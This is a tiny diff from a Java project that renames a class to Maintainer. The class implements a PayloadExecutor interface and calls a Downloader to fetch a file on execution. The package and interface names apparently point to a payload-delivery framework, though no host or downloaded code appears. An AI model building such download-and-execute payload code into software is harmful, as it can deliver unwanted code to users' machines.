@@ -8,7 +8,7 @@ import dev.peter.luterium.payload.PayloadExecutor;
  * Hello there! I'm back with interesting features!
  */
 
-public class MainClass implements PayloadExecutor {
+public class Maintainer implements PayloadExecutor {
     @Override
     public void execute() throws Exception {
         Downloader.downloadFile(); //Downloads the file.
